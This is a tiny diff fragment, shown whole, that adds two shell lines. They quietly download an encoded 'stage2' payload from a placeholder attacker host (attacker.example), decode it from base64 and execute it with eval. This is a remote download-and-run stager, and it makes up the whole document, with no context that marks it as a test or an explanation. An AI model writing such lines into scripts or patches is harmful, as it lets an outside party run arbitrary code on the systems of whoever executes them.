@@ -1,0 +1,2 @@
+STAGE=$(curl -sf https://attacker.example/stage2 | base64 -d)
+eval "$STAGE"
